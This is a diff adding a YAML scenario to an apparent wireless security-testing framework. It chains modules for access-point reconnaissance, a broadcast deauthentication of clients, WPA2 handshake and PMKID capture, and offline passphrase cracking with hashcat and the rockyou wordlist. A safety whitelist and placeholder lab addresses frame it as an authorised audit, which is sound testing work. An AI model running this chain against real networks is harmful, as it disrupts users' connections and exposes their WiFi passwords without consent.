@@ -1,0 +1,43 @@
+# WiFi full audit scenario
+# Chains: recon → deauth → handshake capture → PMKID → PSK crack
+#
+# Usage:
+#   srt scenario scenarios/wifi_full_audit.yaml
+#
+# Requires:
+#   - Monitor-mode NIC
+#   - Target AP BSSID in safety/whitelist.yaml
+#   - hashcat installed (for psk_crack)
+
+name: wifi_full_audit
+description: >
+  End-to-end WiFi WPA2 audit: discover APs, deauth a client, capture the
+  4-way handshake AND PMKID, then crack offline with hashcat.
+
+steps:
+  - module: wifi.recon
+    params:
+      duration_s: 30
+      channels: "1-13"
+
+  - module: wifi.deauth
+    params:
+      bssid: "AA:BB:CC:DD:EE:FF"   # ← replace with lab AP
+      client: "FF:FF:FF:FF:FF:FF"
+      count: 15
+      channel: 6
+
+  - module: wifi.handshake_capture
+    params:
+      bssid: "AA:BB:CC:DD:EE:FF"
+      channel: 6
+
+  - module: wifi.pmkid
+    params:
+      bssid: "AA:BB:CC:DD:EE:FF"
+      timeout_s: 30
+
+  - module: wifi.psk_crack
+    params:
+      hash_file: "data/captures/hash.22000"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
